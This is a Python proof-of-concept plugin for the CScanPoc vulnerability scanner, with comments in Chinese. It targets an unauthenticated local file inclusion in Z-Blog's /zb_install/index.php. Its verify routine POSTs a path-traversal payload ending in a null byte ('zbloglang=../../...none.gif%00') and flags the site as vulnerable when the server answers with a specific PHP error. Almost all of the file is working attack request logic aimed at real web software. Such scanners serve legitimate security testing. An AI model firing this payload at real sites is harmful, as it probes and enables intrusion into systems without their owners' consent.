# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Zblog_0006'  # 平台漏洞编号，留空
    name = 'Zblog前台无需登录包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2015-06-09'  # 漏洞公布时间
    desc = '''
        Z-Blog是由RainbowSoft Studio开发的一款小巧而强大的基于Asp和PHP平台的开源程序，其创始人为朱煊(网名：zx.asd)。
        Zblog /zb_install/index.php 前台无需登录包含漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3213/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zblog'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '70f4b885-d3a5-4e84-acbe-9b03a8a3db6d'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/zb_install/index.php'
            postpayload = 'zbloglang=../../zb_system/image/admin/none.gif%00'
            url = '{target}'.format(target=self.target)+payload
            req = requests.post(url, data=postpayload)

            if req.status_code == 500 and 'Cannot use a scalar value' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
